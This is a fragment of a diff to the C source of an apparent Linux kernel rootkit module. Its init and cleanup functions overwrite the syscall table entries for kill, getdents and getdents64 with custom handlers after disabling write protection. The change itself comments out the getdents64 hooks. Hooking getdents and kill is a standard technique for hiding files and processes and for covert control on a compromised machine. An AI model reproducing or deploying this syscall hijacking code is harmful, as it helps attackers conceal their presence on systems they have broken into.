@@ -160,7 +160,7 @@ static int init(void) { //initial function, sets up syscall hijacking
     GPF_DISABLE; //messy, but 2.6 doesn't allow modification without this. see macro above
     syscall_table[__NR_kill] = (address)new_kill;
     syscall_table[__NR_getdents] = (address)new_getdents;
-    syscall_table[__NR_getdents64] = (address)new_getdents64;
+    //syscall_table[__NR_getdents64] = (address)new_getdents64;
     GPF_ENABLE;
     printk("LOAD OK\n");
 	return 0;
@@ -170,7 +170,7 @@ void cleanup_module(void) {
     GPF_DISABLE;
     syscall_table[__NR_kill] = (address)original_kill; //corrects the hijacking on unload
     syscall_table[__NR_getdents] = (address)original_getdents;
-    syscall_table[__NR_getdents64] = (address)original_getdents64;
+    //syscall_table[__NR_getdents64] = (address)original_getdents64;
     GPF_ENABLE;
     printk("UNLOAD OK\n");
     return;
